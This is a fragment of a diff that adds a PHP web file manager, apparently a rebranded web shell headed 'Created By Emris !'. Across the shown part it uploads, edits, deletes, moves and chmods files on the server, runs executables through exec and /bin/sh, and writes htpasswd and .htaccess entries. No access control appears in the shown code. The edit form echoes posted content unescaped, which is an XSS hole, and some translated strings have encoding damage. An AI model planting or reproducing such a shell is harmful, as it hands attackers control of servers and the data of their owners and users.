+ 970    if ($mode & 0x200) {
+ 971        $other .= ($mode & 00001) ? 't' : 'T';
+ 972    } else {
+ 973        $other .= ($mode & 00001) ? 'x' : '-';
+ 974    }
+ 975 
+ 976    return $type . $owner . $group . $other;
+ 977 
+ 978 }
+ 979 
+ 980 function is_script ($filename) {
+ 981    return ereg('\.php$|\.php3$|\.php4$|\.php5$', $filename);
+ 982 }
+ 983 
+ 984 function getmimetype ($filename) {
+ 985    static $mimes = array(
+ 986        '\.jpg$|\.jpeg$'  => 'image/jpeg',
+ 987        '\.gif$'          => 'image/gif',
+ 988        '\.png$'          => 'image/png',
+ 989        '\.html$|\.html$' => 'text/html',
+ 990        '\.txt$|\.asc$'   => 'text/plain',
+ 991        '\.xml$|\.xsl$'   => 'application/xml',
+ 992        '\.pdf$'          => 'application/pdf'
+ 993    );
+ 994 
+ 995    foreach ($mimes as $regex => $mime) {
+ 996        if (eregi($regex, $filename)) return $mime;
+ 997    }
+ 998 
+ 999    // return 'application/octet-stream';
+1000    return 'text/plain';
+1001 
+1002 }
+1003 
+1004 function del ($file) {
+1005    global $delim;
+1006 
+1007    if (!@is_link($file) && !file_exists($file)) return false;
+1008 
+1009    if (!@is_link($file) && @is_dir($file)) {
+1010 
+1011        if ($dir = @opendir($file)) {
+1012 
+1013            $error = false;
+1014 
+1015            while (($f = readdir($dir)) !== false) {
+1016                if ($f != '.' && $f != '..' && !del($file . $delim . $f)) {
+1017                    $error = true;
+1018                }
+1019            }
+1020            closedir($dir);
+1021 
+1022            if (!$error) return @rmdir($file);
+1023 
+1024            return !$error;
+1025 
+1026        } else {
+1027            return false;
+1028        }
+1029 
+1030    } else {
+1031        return @unlink($file);
+1032    }
+1033 
+1034 }
+1035 
+1036 function addslash ($directory) {
+1037    global $delim;
+1038 
+1039    if (substr($directory, -1, 1) != $delim) {
+1040        return $directory . $delim;
+1041    } else {
+1042        return $directory;
+1043    }
+1044 
+1045 }
+1046 
+1047 function relative2absolute ($string, $directory) {
+1048 
+1049    if (path_is_relative($string)) {
+1050        return simplify_path(addslash($directory) . $string);
+1051    } else {
+1052        return simplify_path($string);
+1053    }
+1054 
+1055 }
+1056 
+1057 function path_is_relative ($path) {
+1058    global $win;
+1059 
+1060    if ($win) {
+1061        return (substr($path, 1, 1) != ':');
+1062    } else {
+1063        return (substr($path, 0, 1) != '/');
+1064    }
+1065 
+1066 }
+1067 
+1068 function absolute2relative ($directory, $target) {
+1069    global $delim;
+1070 
+1071    $path = '';
+1072    while ($directory != $target) {
+1073        if ($directory == substr($target, 0, strlen($directory))) {
+1074            $path .= substr($target, strlen($directory));
+1075            break;
+1076        } else {
+1077            $path .= '..' . $delim;
+1078            $directory = substr($directory, 0, strrpos(substr($directory, 0, -1), $delim) + 1);
+1079        }
+1080    }
+1081    if ($path == '') $path = '.';
+1082 
+1083    return $path;
+1084 
+1085 }
+1086 
+1087 function simplify_path ($path) {
+1088    global $delim;
+1089 
+1090    if (@file_exists($path) && function_exists('realpath') && @realpath($path) != '') {
+1091        $path = realpath($path);
+1092        if (@is_dir($path)) {
+1093            return addslash($path);
+1094        } else {
+1095            return $path;
+1096        }
+1097    }
+1098 
+1099    $pattern  = $delim . '.' . $delim;
+1100 
+1101    if (@is_dir($path)) {
+1102        $path = addslash($path);
+1103    }
+1104 
+1105    while (strpos($path, $pattern) !== false) {
+1106        $path = str_replace($pattern, $delim, $path);
+1107    }
+1108 
+1109    $e = addslashes($delim);
+1110    $regex = $e . '((\.[^\.' . $e . '][^' . $e . ']*)|(\.\.[^' . $e . ']+)|([^\.][^' . $e . ']*))' . $e . '\.\.' . $e;
+1111 
+1112    while (ereg($regex, $path)) {
+1113        $path = ereg_replace($regex, $delim, $path);
+1114    }
+1115    
+1116    return $path;
+1117 
+1118 }
+1119 
+1120 function human_filesize ($filesize) {
+1121 
+1122    $suffices = 'kMGTPE';
+1123 
+1124    $n = 0;
+1125    while ($filesize >= 1000) {
+1126        $filesize /= 1024;
+1127        $n++;
+1128    }
+1129 
+1130    $filesize = round($filesize, 3 - strpos($filesize, '.'));
+1131 
+1132    if (strpos($filesize, '.') !== false) {
+1133        while (in_array(substr($filesize, -1, 1), array('0', '.'))) {
+1134            $filesize = substr($filesize, 0, strlen($filesize) - 1);
+1135        }
+1136    }
+1137 
+1138    $suffix = (($n == 0) ? '' : substr($suffices, $n - 1, 1));
+1139 
+1140    return $filesize . " {$suffix}B";
+1141 
+1142 }
+1143 
+1144 function strip (&$str) {
+1145    $str = stripslashes($str);
+1146 }
+1147 
+1148 /* ------------------------------------------------------------------------- */
+1149 
+1150 function listing_page ($message = null) {
+1151    global $self, $directory, $sort, $reverse;
+1152 
+1153    html_header();
+1154 
+1155    $list = getlist($directory);
+1156 
+1157    if (array_key_exists('sort', $_GET)) $sort = $_GET['sort']; else $sort = 'filename';
+1158    if (array_key_exists('reverse', $_GET) && $_GET['reverse'] == 'true') $reverse = true; else $reverse = false;
+1159 
+1160    sortlist($list, $sort, $reverse);
+1161 
+1162    echo '<h1 style="margin-bottom: 0">Created By Emris !</h1>
+1163 
+1164 <form enctype="multipart/form-data" action="' . $self . '" method="post">
+1165 
+1166 <table id="main">
+1167 ';
+1168 
+1169    directory_choice();
+1170 
+1171    if (!empty($message)) {
+1172        spacer();
+1173        echo $message;
+1174    }
+1175 
+1176    if (@is_writable($directory)) {
+1177        upload_box();
+1178        create_box();
+1179    } else {
+1180        spacer();
+1181    }
+1182 
+1183    if ($list) {
+1184        listing($list);
+1185    } else {
+1186        echo error('not_readable', $directory);
+1187    }
+1188 
+1189    echo '</table>
+1190 
+1191 </form>
+1192 
+1193 ';
+1194 
+1195    html_footer();
+1196 
+1197 }
+1198 
+1199 function listing ($list) {
+1200    global $directory, $homedir, $sort, $reverse, $win, $cols, $date_format, $self;
+1201 
+1202    echo '<tr class="listing">
+1203   <th style="text-align: center; vertical-align: middle"><img src="' . $self . '?image=smiley" alt="smiley" /></th>
+1204 ';
+1205 
+1206    $d = 'dir=' . urlencode($directory) . '&amp;';
+1207 
+1208    if (!$reverse && $sort == 'filename') $r = '&amp;reverse=true'; else $r = '';
+1209    echo "\t<th class=\"filename\"><a href=\"$self?{$d}sort=filename$r\">" . word('filename') . "</a></th>\n";
+1210 
+1211   if (!$reverse && $sort == 'size') $r = '&amp;reverse=true'; else $r = '';
+1212   echo "\t<th class=\"size\"><a href=\"$self?{$d}sort=size$r\">" . word('size') . "</a></th>\n";
+1213 
+1214   if (!$win) {
+1215 
+1216       if (!$reverse && $sort == 'permission') $r = '&amp;reverse=true'; else $r = '';
+1217       echo "\t<th class=\"permission_header\"><a href=\"$self?{$d}sort=permission$r\">" . word('permission') . "</a></th>\n";
+1218 
+1219       if (!$reverse && $sort == 'owner') $r = '&amp;reverse=true'; else $r = '';
+1220       echo "\t<th class=\"owner\"><a href=\"$self?{$d}sort=owner$r\">" . word('owner') . "</a></th>\n";
+1221 
+1222       if (!$reverse && $sort == 'group') $r = '&amp;reverse=true'; else $r = '';
+1223       echo "\t<th class=\"group\"><a href=\"$self?{$d}sort=group$r\">" . word('group') . "</a></th>\n";
+1224 
+1225   }
+1226 
+1227   echo '  <th class="functions">' . word('functions') . '</th>
+1228 </tr>
+1229 ';
+1230 
+1231   for ($i = 0; $i < sizeof($list); $i++) {
+1232       $file = $list[$i];
+1233 
+1234       $timestamps  = 'mtime: ' . date($date_format, $file['mtime']) . ', ';
+1235       $timestamps .= 'atime: ' . date($date_format, $file['atime']) . ', ';
+1236       $timestamps .= 'ctime: ' . date($date_format, $file['ctime']);
+1237 
+1238       echo '<tr class="listing">
+1239   <td class="checkbox"><input type="checkbox" name="checked' . $i . '" value="true" onfocus="activate(\'other\')" /></td>
+1240   <td class="filename" title="' . html($timestamps) . '">';
+1241 
+1242        if ($file['is_link']) {
+1243 
+1244            echo '<img src="' . $self . '?image=link" alt="link" /> ';
+1245            echo html($file['filename']) . ' &rarr; ';
+1246 
+1247            $real_file = relative2absolute($file['target'], $directory);
+1248 
+1249            if (@is_readable($real_file)) {
+1250                if (@is_dir($real_file)) {
+1251                    echo '[ <a href="' . $self . '?dir=' . urlencode($real_file) . '">' . html($file['target']) . '</a> ]';
+1252                } else {
+1253                    echo '<a href="' . $self . '?action=view&amp;file=' . urlencode($real_file) . '">' . html($file['target']) . '</a>';
+1254                }
+1255            } else {
+1256                echo html($file['target']);
+1257            }
+1258 
+1259        } elseif ($file['is_dir']) {
+1260 
+1261            echo '<img src="' . $self . '?image=folder" alt="folder" /> [ ';
+1262            if ($win || $file['is_executable']) {
+1263                echo '<a href="' . $self . '?dir=' . urlencode($file['path']) . '">' . html($file['filename']) . '</a>';
+1264            } else {
+1265                echo html($file['filename']);
+1266            }
+1267            echo ' ]';
+1268 
+1269        } else {
+1270 
+1271            if (substr($file['filename'], 0, 1) == '.') {
+1272                echo '<img src="' . $self . '?image=hidden_file" alt="hidden file" /> ';
+1273            } else {
+1274                echo '<img src="' . $self . '?image=file" alt="file" /> ';
+1275            }
+1276 
+1277            if ($file['is_file'] && $file['is_readable']) {
+1278               echo '<a href="' . $self . '?action=view&amp;file=' . urlencode($file['path']) . '">' . html($file['filename']) . '</a>';
+1279            } else {
+1280                echo html($file['filename']);
+1281            }
+1282 
+1283        }
+1284 
+1285        if ($file['size'] >= 1000) {
+1286            $human = ' title="' . human_filesize($file['size']) . '"';
+1287        } else {
+1288            $human = '';
+1289        }
+1290 
+1291        echo "\t<td class=\"size\"$human>{$file['size']} B</td>\n";
+1292 
+1293        if (!$win) {
+1294 
+1295            echo "\t<td class=\"permission\" title=\"" . decoct($file['permission']) . '">';
+1296 
+1297            $l = !$file['is_link'] && (!function_exists('posix_getuid') || $file['owner'] == posix_getuid());
+1298            if ($l) echo '<a href="' . $self . '?action=permission&amp;file=' . urlencode($file['path']) . '&amp;dir=' . urlencode($directory) . '">';
+1299            echo html(permission_octal2string($file['permission']));
+1300            if ($l) echo '</a>';
+1301 
+1302            echo "</td>\n";
+1303 
+1304            if (array_key_exists('owner_name', $file)) {
+1305                echo "\t<td class=\"owner\" title=\"uid: {$file['owner']}\">{$file['owner_name']}</td>\n";
+1306            } else {
+1307                echo "\t<td class=\"owner\">{$file['owner']}</td>\n";
+1308            }
+1309 
+1310            if (array_key_exists('group_name', $file)) {
+1311                echo "\t<td class=\"group\" title=\"gid: {$file['group']}\">{$file['group_name']}</td>\n";
+1312            } else {
+1313                echo "\t<td class=\"group\">{$file['group']}</td>\n";
+1314            }
+1315 
+1316        }
+1317 
+1318        echo '  <td class="functions">
+1319       <input type="hidden" name="file' . $i . '" value="' . html($file['path']) . '" />
+1320 ';
+1321 
+1322        $actions = array();
+1323        if (function_exists('symlink')) {
+1324            $actions[] = 'create_symlink';
+1325        }
+1326        if (@is_writable(dirname($file['path']))) {
+1327            $actions[] = 'delete';
+1328            $actions[] = 'rename';
+1329            $actions[] = 'move';
+1330        }
+1331        if ($file['is_file'] && $file['is_readable']) {
+1332            $actions[] = 'copy';
+1333            $actions[] = 'download';
+1334            if ($file['is_writable']) $actions[] = 'edit';
+1335        }
+1336        if (!$win && function_exists('exec') && $file['is_file'] && $file['is_executable'] && file_exists('/bin/sh')) {
+1337            $actions[] = 'execute';
+1338        }
+1339 
+1340        if (sizeof($actions) > 0) {
+1341 
+1342            echo '      <select class="small" name="action' . $i . '" size="1">
+1343       <option value="">' . str_repeat('&nbsp;', 30) . '</option>
+1344 ';
+1345 
+1346            foreach ($actions as $action) {
+1347                echo "\t\t<option value=\"$action\">" . word($action) . "</option>\n";
+1348           }
+1349 
+1350           echo '      </select>
+1351       <input class="small" type="submit" name="submit' . $i . '" value=" &gt; " onfocus="activate(\'other\')" />
+1352 ';
+1353 
+1354        }
+1355 
+1356        echo '  </td>
+1357 </tr>
+1358 ';
+1359 
+1360    }
+1361 
+1362    echo '<tr class="listing_footer">
+1363   <td style="text-align: right; vertical-align: top"><img src="' . $self . '?image=arrow" alt="&gt;" /></td>
+1364   <td colspan="' . ($cols - 1) . '">
+1365       <input type="hidden" name="num" value="' . sizeof($list) . '" />
+1366       <input type="hidden" name="focus" value="" />
+1367       <input type="hidden" name="olddir" value="' . html($directory) . '" />
+1368 ';
+1369 
+1370    $actions = array();
+1371    if (@is_writable(dirname($file['path']))) {
+1372        $actions[] = 'delete';
+1373        $actions[] = 'move';
+1374    }
+1375    $actions[] = 'copy';
+1376 
+1377    echo '      <select class="small" name="action_all" size="1">
+1378       <option value="">' . str_repeat('&nbsp;', 30) . '</option>
+1379 ';
+1380 
+1381    foreach ($actions as $action) {
+1382        echo "\t\t<option value=\"$action\">" . word($action) . "</option>\n";
+1383   }
+1384 
+1385   echo '      </select>
+1386       <input class="small" type="submit" name="submit_all" value=" &gt; " onfocus="activate(\'other\')" />
+1387   </td>
+1388 </tr>
+1389 ';
+1390 
+1391 }
+1392 
+1393 function directory_choice () {
+1394    global $directory, $homedir, $cols, $self;
+1395 
+1396    echo '<tr>
+1397   <td colspan="' . $cols . '" id="directory">
+1398       <a href="' . $self . '?dir=' . urlencode($homedir) . '">' . word('directory') . '</a>:
+1399       <input type="text" name="dir" size="' . textfieldsize($directory) . '" value="' . html($directory) . '" onfocus="activate(\'directory\')" />
+1400       <input type="submit" name="changedir" value="' . word('change') . '" onfocus="activate(\'directory\')" />
+1401   </td>
+1402 </tr>
+1403 ';
+1404 
+1405 }
+1406 
+1407 function upload_box () {
+1408    global $cols;
+1409 
+1410    echo '<tr>
+1411   <td colspan="' . $cols . '" id="upload">
+1412       ' . word('file') . ':
+1413       <input type="file" name="upload" onfocus="activate(\'other\')" />
+1414       <input type="submit" name="submit_upload" value="' . word('upload') . '" onfocus="activate(\'other\')" />
+1415   </td>
+1416 </tr>
+1417 ';
+1418 
+1419 }
+1420 
+1421 function create_box () {
+1422    global $cols;
+1423 
+1424    echo '<tr>
+1425   <td colspan="' . $cols . '" id="create">
+1426       <select name="create_type" size="1" onfocus="activate(\'create\')">
+1427       <option value="file">' . word('file') . '</option>
+1428       <option value="directory">' . word('directory') . '</option>
+1429       </select>
+1430       <input type="text" name="create_name" onfocus="activate(\'create\')" />
+1431       <input type="submit" name="submit_create" value="' . word('create') . '" onfocus="activate(\'create\')" />
+1432   </td>
+1433 </tr>
+1434 ';
+1435 
+1436 }
+1437 
+1438 function edit ($file) {
+1439    global $self, $directory, $editcols, $editrows, $apache, $htpasswd, $htaccess;
+1440 
+1441    html_header();
+1442 
+1443    echo '<h2 style="margin-bottom: 3pt">' . html($file) . '</h2>
+1444 
+1445 <form action="' . $self . '" method="post">
+1446 
+1447 <table class="dialog">
+1448 <tr>
+1449 <td class="dialog">
+1450 
+1451   <textarea name="content" cols="' . $editcols . '" rows="' . $editrows . '" WRAP="off">';
+1452 
+1453    if (array_key_exists('content', $_POST)) {
+1454        echo $_POST['content'];
+1455    } else {
+1456        $f = fopen($file, 'r');
+1457        while (!feof($f)) {
+1458            echo html(fread($f, 8192));
+1459        }
+1460        fclose($f);
+1461    }
+1462 
+1463    if (!empty($_POST['user'])) {
+1464        echo "\n" . $_POST['user'] . ':' . crypt($_POST['password']);
+1465    }
+1466    if (!empty($_POST['basic_auth'])) {
+1467        if ($win) {
+1468            $authfile = str_replace('\\', '/', $directory) . $htpasswd;
+1469        } else {
+1470            $authfile = $directory . $htpasswd;
+1471        }
+1472        echo "\nAuthType Basic\nAuthName &quot;Restricted Directory&quot;\n";
+1473        echo 'AuthUserFile &quot;' . html($authfile) . "&quot;\n";
+1474        echo 'Require valid-user';
+1475    }
+1476 
+1477    echo '</textarea>
+1478 
+1479   <hr />
+1480 ';
+1481 
+1482    if ($apache && basename($file) == $htpasswd) {
+1483        echo '
+1484   ' . word('user') . ': <input type="text" name="user" />
+1485   ' . word('password') . ': <input type="password" name="password" />
+1486   <input type="submit" value="' . word('add') . '" />
+1487 
+1488   <hr />
+1489 ';
+1490 
+1491    }
+1492 
+1493    if ($apache && basename($file) == $htaccess) {
+1494        echo '
+1495   <input type="submit" name="basic_auth" value="' . word('add_basic_auth') . '" />
+1496 
+1497   <hr />
+1498 ';
+1499 
+1500    }
+1501 
+1502    echo '
+1503   <input type="hidden" name="action" value="edit" />
+1504   <input type="hidden" name="file" value="' . html($file) . '" />
+1505   <input type="hidden" name="dir" value="' . html($directory) . '" />
+1506   <input type="reset" value="' . word('reset') . '" id="red_button" />
+1507   <input type="submit" name="save" value="' . word('save') . '" id="green_button" style="margin-left: 50px" />
+1508 
+1509 </td>
+1510 </tr>
+1511 </table>
+1512 
+1513 <p><a href="' . $self . '?dir=' . urlencode($directory) . '">[ ' . word('back') . ' ]</a></p>
+1514 
+1515 </form>
+1516 
+1517 ';
+1518 
+1519    html_footer();
+1520 
+1521 }
+1522 
+1523 function spacer () {
+1524    global $cols;
+1525 
+1526    echo '<tr>
+1527   <td colspan="' . $cols . '" style="height: 1em"></td>
+1528 </tr>
+1529 ';
+1530 
+1531 }
+1532 
+1533 function textfieldsize ($content) {
+1534 
+1535    $size = strlen($content) + 5;
+1536    if ($size < 30) $size = 30;
+1537 
+1538    return $size;
+1539 
+1540 }
+1541 
+1542 function request_dump () {
+1543 
+1544    foreach ($_REQUEST as $key => $value) {
+1545        echo "\t<input type=\"hidden\" name=\"" . html($key) . '" value="' . html($value) . "\" />\n";
+1546    }
+1547 
+1548 }
+1549 
+1550 /* ------------------------------------------------------------------------- */
+1551 
+1552 function html ($string) {
+1553    global $site_charset;
+1554    return htmlentities($string, ENT_COMPAT, $site_charset);
+1555 }
+1556 
+1557 function word ($word) {
+1558    global $words, $word_charset;
+1559    return htmlentities($words[$word], ENT_COMPAT, $word_charset);
+1560 }
+1561 
+1562 function phrase ($phrase, $arguments) {
+1563    global $words;
+1564    static $search;
+1565 
+1566    if (!is_array($search)) for ($i = 1; $i <= 8; $i++) $search[] = "%$i";
+1567 
+1568    for ($i = 0; $i < sizeof($arguments); $i++) {
+1569        $arguments[$i] = nl2br(html($arguments[$i]));
+1570    }
+1571 
+1572    $replace = array('{' => '<pre>', '}' =>'</pre>', '[' => '<b>', ']' => '</b>');
+1573 
+1574    return str_replace($search, $arguments, str_replace(array_keys($replace), $replace, nl2br(html($words[$phrase]))));
+1575 
+1576 }
+1577 
+1578 function getwords ($lang) {
+1579    global $word_charset, $date_format;
+1580 
+1581    switch ($lang) {
+1582    case 'de':
+1583 
+1584        $date_format = 'd.m.y H:i:s';
+1585        $word_charset = 'ISO-8859-1';
+1586 
+1587        return array(
+1588 'directory' => 'Verzeichnis',
+1589 'file' => 'Datei',
+1590 'filename' => 'Dateiname',
+1591 
+1592 'size' => 'Gr��e',
+1593 'permission' => 'Rechte',
+1594 'owner' => 'Eigner',
+1595 'group' => 'Gruppe',
+1596 'other' => 'Andere',
+1597 'functions' => 'Funktionen',
+1598 
+1599 'read' => 'lesen',
+1600 'write' => 'schreiben',
+1601 'execute' => 'ausf�hren',
+1602 
+1603 'create_symlink' => 'Symlink erstellen',
+1604 'delete' => 'l�schen',
+1605 'rename' => 'umbenennen',
+1606 'move' => 'verschieben',
+1607 'copy' => 'kopieren',
+1608 'edit' => 'editieren',
+1609 'download' => 'herunterladen',
+1610 'upload' => 'hochladen',
+1611 'create' => 'erstellen',
+1612 'change' => 'wechseln',
+1613 'save' => 'speichern',
+1614 'set' => 'setze',
+1615 'reset' => 'zur�cksetzen',
+1616 'relative' => 'Pfad zum Ziel relativ',
+1617 
+1618 'yes' => 'Ja',
+1619 'no' => 'Nein',
+1620 'back' => 'zur�ck',
+1621 'destination' => 'Ziel',
+1622 'symlink' => 'Symbolischer Link',
+1623 'no_output' => 'keine Ausgabe',
+1624 
+1625 'user' => 'Benutzername',
+1626 'password' => 'Kennwort',
+1627 'add' => 'hinzuf�gen',
+1628 'add_basic_auth' => 'HTTP-Basic-Auth hinzuf�gen',
+1629 
+1630 'uploaded' => '"[%1]" wurde hochgeladen.',
+1631 'not_uploaded' => '"[%1]" konnte nicht hochgeladen werden.',
+1632 'already_exists' => '"[%1]" existiert bereits.',
+1633 'created' => '"[%1]" wurde erstellt.',
+1634 'not_created' => '"[%1]" konnte nicht erstellt werden.',
+1635 'really_delete' => 'Sollen folgende Dateien wirklich gel�scht werden?',
+1636 'deleted' => "Folgende Dateien wurden gel�scht:\n[%1]",
+1637 'not_deleted' => "Folgende Dateien konnten nicht gel�scht werden:\n[%1]",
+1638 'rename_file' => 'Benenne Datei um:',
+1639 'renamed' => '"[%1]" wurde in "[%2]" umbenannt.',
+1640 'not_renamed' => '"[%1] konnte nicht in "[%2]" umbenannt werden.',
+1641 'move_files' => 'Verschieben folgende Dateien:',
+1642 'moved' => "Folgende Dateien wurden nach \"[%2]\" verschoben:\n[%1]",
+1643 'not_moved' => "Folgende Dateien konnten nicht nach \"[%2]\" verschoben werden:\n[%1]",
+1644 'copy_files' => 'Kopiere folgende Dateien:',
+1645 'copied' => "Folgende Dateien wurden nach \"[%2]\" kopiert:\n[%1]",
+1646 'not_copied' => "Folgende Dateien konnten nicht nach \"[%2]\" kopiert werden:\n[%1]",
+1647 'not_edited' => '"[%1]" kann nicht editiert werden.',
+1648 'executed' => "\"[%1]\" wurde erfolgreich ausgef�hrt:\n{\%2}",
+1649 'not_executed' => "\"[%1]\" konnte nicht erfolgreich ausgef�hrt werden:\n{\%2}",
+1650 'saved' => '"[%1]" wurde gespeichert.',
+1651 'not_saved' => '"[%1]" konnte nicht gespeichert werden.',
+1652 'symlinked' => 'Symbolischer Link von "[%2]" nach "[%1]" wurde erstellt.',
+1653 'not_symlinked' => 'Symbolischer Link von "[%2]" nach "[%1]" konnte nicht erstellt werden.',
+1654 'permission_for' => 'Rechte f�r "[%1]":',
+1655 'permission_set' => 'Die Rechte f�r "[%1]" wurden auf [%2] gesetzt.',
+1656 'permission_not_set' => 'Die Rechte f�r "[%1]" konnten nicht auf [%2] gesetzt werden.',
+1657 'not_readable' => '"[%1]" kann nicht gelesen werden.'
+1658        );
+1659 
+1660    case 'fr':
+1661 
+1662        $date_format = 'd.m.y H:i:s';
+1663        $word_charset = 'ISO-8859-1';
+1664 
+1665        return array(
+1666 'directory' => 'R�pertoire',
+1667 'file' => 'Fichier',
+1668 'filename' => 'Nom fichier',
+1669 
+1670 'size' => 'Taille',
+1671 'permission' => 'Droits',
+1672 'owner' => 'Propri�taire',
+1673 'group' => 'Groupe',
+1674 'other' => 'Autres',
+1675 'functions' => 'Fonctions',
+1676 
+1677 'read' => 'Lire',
+1678 'write' => 'Ecrire',
+1679 'execute' => 'Ex�cuter',
+1680 
+1681 'create_symlink' => 'Cr�er lien symbolique',
+1682 'delete' => 'Effacer',
+1683 'rename' => 'Renommer',
+1684 'move' => 'D�placer',
+1685 'copy' => 'Copier',
+1686 'edit' => 'Ouvrir',
+1687 'download' => 'T�l�charger sur PC',
+1688 'upload' => 'T�l�charger sur serveur',
+1689 'create' => 'Cr�er',
+1690 'change' => 'Changer',
+1691 'save' => 'Sauvegarder',
+1692 'set' => 'Ex�cuter',
+1693 'reset' => 'R�initialiser',
+1694 'relative' => 'Relatif',
+1695 
+1696 'yes' => 'Oui',
+1697 'no' => 'Non',
+1698 'back' => 'Retour',
+1699 'destination' => 'Destination',
+1700 'symlink' => 'Lien symbollique',
+1701 'no_output' => 'Pas de sortie',
+1702 
+1703 'user' => 'Utilisateur',
+1704 'password' => 'Mot de passe',
+1705 'add' => 'Ajouter',
+1706 'add_basic_auth' => 'add basic-authentification',
+1707 
+1708 'uploaded' => '"[%1]" a �t� t�l�charg� sur le serveur.',
+1709 'not_uploaded' => '"[%1]" n a pas �t� t�l�charg� sur le serveur.',
+1710 'already_exists' => '"[%1]" existe d�j�.',
+1711 'created' => '"[%1]" a �t� cr��.',
+1712 'not_created' => '"[%1]" n a pas pu �tre cr��.',
+1713 'really_delete' => 'Effacer le fichier?',
+1714 'deleted' => "Ces fichiers ont �t� d�tuits:\n[%1]",
+1715 'not_deleted' => "Ces fichiers n ont pu �tre d�truits:\n[%1]",
+1716 'rename_file' => 'Renomme fichier:',
+1717 'renamed' => '"[%1]" a �t� renomm� en "[%2]".',
+1718 'not_renamed' => '"[%1] n a pas pu �tre renomm� en "[%2]".',
+1719 'move_files' => 'D�placer ces fichiers:',
+1720 'moved' => "Ces fichiers ont �t� d�plac�s en \"[%2]\":\n[%1]",
+1721 'not_moved' => "Ces fichiers n ont pas pu �tre d�plac�s en \"[%2]\":\n[%1]",
+1722 'copy_files' => 'Copier ces fichiers:',
+1723 'copied' => "Ces fichiers ont �t� copi�s en \"[%2]\":\n[%1]",
+1724 'not_copied' => "Ces fichiers n ont pas pu �tre copi�s en \"[%2]\":\n[%1]",
+1725 'not_edited' => '"[%1]" ne peut �tre ouvert.',
+1726 'executed' => "\"[%1]\" a �t� brillamment ex�cut� :\n{\%2}",
+1727 'not_executed' => "\"[%1]\" n a pas pu �tre ex�cut�:\n{\%2}",
+1728 'saved' => '"[%1]" a �t� sauvegard�.',
+1729 'not_saved' => '"[%1]" n a pas pu �tre sauvegard�.',
+1730 'symlinked' => 'Un lien symbolique depuis "[%2]" vers "[%1]" a �t� cr�e.',
+1731 'not_symlinked' => 'Un lien symbolique depuis "[%2]" vers "[%1]" n a pas pu �tre cr��.',
+1732 'permission_for' => 'Droits de "[%1]":',
+1733 'permission_set' => 'Droits de "[%1]" ont �t� chang�s en [%2].',
+1734 'permission_not_set' => 'Droits de "[%1]" n ont pas pu �tre chang�s en[%2].',
+1735 'not_readable' => '"[%1]" ne peut pas �tre ouvert.'
+1736        );
+1737 
+1738    case 'it':
+1739 
+1740        $date_format = 'd-m-Y H:i:s';
+1741        $word_charset = 'ISO-8859-1';
+1742 
+1743        return array(
+1744 'directory' => 'Directory',
+1745 'file' => 'File',
+1746 'filename' => 'Nome File',
+1747 
+1748 'size' => 'Dimensioni',
+1749 'permission' => 'Permessi',
+1750 'owner' => 'Proprietario',
+1751 'group' => 'Gruppo',
+1752 'other' => 'Altro',
+1753 'functions' => 'Funzioni',
+1754 
+1755 'read' => 'leggi',
+1756 'write' => 'scrivi',
+1757 'execute' => 'esegui',
+1758 
+1759 'create_symlink' => 'crea link simbolico',
+1760 'delete' => 'cancella',
+1761 'rename' => 'rinomina',
+1762 'move' => 'sposta',
+1763 'copy' => 'copia',
+1764 'edit' => 'modifica',
+1765 'download' => 'download',
+1766 'upload' => 'upload',
+1767 'create' => 'crea',
+1768 'change' => 'cambia',
+1769 'save' => 'salva',
+1770 'set' => 'imposta',
+1771 'reset' => 'reimposta',
+1772 'relative' => 'Percorso relativo per la destinazione',
+1773 
+1774 'yes' => 'Si',
+1775 'no' => 'No',
+1776 'back' => 'indietro',
+1777 'destination' => 'Destinazione',
+1778 'symlink' => 'Link simbolico',
+1779 'no_output' => 'no output',
+1780 
+1781 'user' => 'User',
+1782 'password' => 'Password',
+1783 'add' => 'aggiungi',
+1784 'add_basic_auth' => 'aggiungi autenticazione base',
+1785 
+1786 'uploaded' => '"[%1]" � stato caricato.',
+1787 'not_uploaded' => '"[%1]" non � stato caricato.',
+1788 'already_exists' => '"[%1]" esiste gi�.',
+1789 'created' => '"[%1]" � stato creato.',
+1790 'not_created' => '"[%1]" non � stato creato.',
+1791 'really_delete' => 'Cancello questi file ?',
+1792 'deleted' => "Questi file sono stati cancellati:\n[%1]",
+1793 'not_deleted' => "Questi file non possono essere cancellati:\n[%1]",
+1794 'rename_file' => 'File rinominato:',
+1795 'renamed' => '"[%1]" � stato rinominato in "[%2]".',
+1796 'not_renamed' => '"[%1] non � stato rinominato in "[%2]".',
+1797 'move_files' => 'Sposto questi file:',
+1798 'moved' => "Questi file sono stati spostati in \"[%2]\":\n[%1]",
+1799 'not_moved' => "Questi file non possono essere spostati in \"[%2]\":\n[%1]",
+1800 'copy_files' => 'Copio questi file',
+1801 'copied' => "Questi file sono stati copiati in \"[%2]\":\n[%1]",
+1802 'not_copied' => "Questi file non possono essere copiati in \"[%2]\":\n[%1]",
+1803 'not_edited' => '"[%1]" non pu� essere modificato.',
+1804 'executed' => "\"[%1]\" � stato eseguito con successo:\n{\%2}",
+1805 'not_executed' => "\"[%1]\" non � stato eseguito con successo\n{\%2}",
+1806 'saved' => '"[%1]" � stato salvato.',
+1807 'not_saved' => '"[%1]" non � stato salvato.',
+1808 'symlinked' => 'Il link siambolico da "[%2]" a "[%1]" � stato creato.',
+1809 'not_symlinked' => 'Il link siambolico da "[%2]" a "[%1]" non � stato creato.',
+1810 'permission_for' => 'Permessi di "[%1]":',
+1811 'permission_set' => 'I permessi di "[%1]" sono stati impostati [%2].',
+1812 'permission_not_set' => 'I permessi di "[%1]" non sono stati impostati [%2].',
+1813 'not_readable' => '"[%1]" non pu� essere letto.'
+1814        );
+1815 
+1816    case 'nl':
+1817 
+1818        $date_format = 'n/j/y H:i:s';
+1819        $word_charset = 'ISO-8859-1';
+1820 
+1821        return array(
+1822 'directory' => 'Directory',
+1823 'file' => 'Bestand',
+1824 'filename' => 'Bestandsnaam',
+1825 
+1826 'size' => 'Grootte',
+1827 'permission' => 'Bevoegdheid',
+1828 'owner' => 'Eigenaar',
+1829 'group' => 'Groep',
+1830 'other' => 'Anderen',
+1831 'functions' => 'Functies',
+1832 
+1833 'read' => 'lezen',
+1834 'write' => 'schrijven',
+1835 'execute' => 'uitvoeren',
+1836 
+1837 'create_symlink' => 'maak symlink',
+1838 'delete' => 'verwijderen',
+1839 'rename' => 'hernoemen',
+1840 'move' => 'verplaatsen',
+1841 'copy' => 'kopieren',
+1842 'edit' => 'bewerken',
+1843 'download' => 'downloaden',
+1844 'upload' => 'uploaden',
+1845 'create' => 'aanmaken',
+1846 'change' => 'veranderen',
+1847 'save' => 'opslaan',
+1848 'set' => 'instellen',
+1849 'reset' => 'resetten',
